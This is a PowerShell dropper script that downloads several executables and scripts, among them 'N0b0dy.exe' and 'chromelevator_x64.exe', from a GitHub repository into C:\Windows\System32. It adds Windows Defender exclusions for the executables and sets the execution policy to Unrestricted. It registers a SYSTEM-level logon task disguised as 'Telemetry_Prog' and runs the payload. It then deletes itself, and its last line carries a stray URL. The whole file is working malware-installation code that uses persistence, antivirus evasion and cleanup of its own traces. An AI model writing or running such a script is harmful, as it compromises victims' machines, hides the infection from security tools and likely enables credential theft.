# fetch payload from github
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup1.ps1' -OutFile "C:\Windows\System32\cleanup1.ps1" 
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup2.ps1' -OutFile "C:\Windows\System32\exitstrategy.ps1" 
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "C:\Windows\System32\cleanup.ps1" 
# add exlusion to files
Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
# set execution policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
# add schedule to start ddrcc.ps1
# add variables for scheduler
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\ddrcc.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
# start process
& "C:\Windows\System32\ddrcc.ps1"
# re-enable real time protection
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-Item -Path $MyInvocation.MyCommand.Source -Force https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1

